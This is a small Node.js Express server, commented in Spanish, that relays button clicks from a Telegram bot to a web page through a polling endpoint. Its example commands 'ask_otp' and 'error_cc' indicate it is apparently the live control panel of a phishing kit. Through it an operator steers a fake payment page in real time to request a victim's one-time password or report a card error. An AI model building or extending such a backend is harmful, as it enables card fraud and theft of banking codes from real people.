const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.json());

// Almacenamiento temporal de órdenes (En memoria)
// Estructura: { 'chat_id_de_telegram': 'comando' }
let userCommands = {};

// 1. Endpoint que recibe los CLICS desde Telegram (Webhook)
app.post('/telegram-webhook', async (req, res) => {
    const callback = req.body.callback_query;
    
    if (callback) {
        const chatId = callback.message.chat.id;
        const data = callback.data; // Ej: 'ask_otp', 'error_cc'
        
        console.log(`[Telegram] Recibido comando: ${data} del chat: ${chatId}`);
        
        // Guardamos la orden para que la página web la lea
        userCommands['current'] = data; // Usamos 'current' por simplicidad para este demo

        // Respondemos a Telegram para quitar el relojito de carga en el botón
        try {
            // Nota: Necesitas poner tu TOKEN aquí si quieres que el relojito desaparezca rápido, 
            // pero funcionará igual sin esto.
            res.status(200).send('OK');
        } catch (error) {
            console.error(error);
        }
    } else {
        res.status(200).send('OK');
    }
});

// 2. Endpoint que consulta la PÁGINA WEB (Polling)
app.get('/check-status', (req, res) => {
    // La página pregunta: "¿Hay algo para mí?"
    const command = userCommands['current'];
    
    if (command) {
        // Si hay comando, lo enviamos y lo borramos para no repetirlo
        res.json({ command: command });
        userCommands['current'] = null; 
        console.log(`[Web] Comando enviado a la página: ${command}`);
    } else {
        res.json({ command: null });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en http://localhost:${PORT}`);
    console.log(`👉 Para conectar Telegram, necesitas usar NGROK.`);
});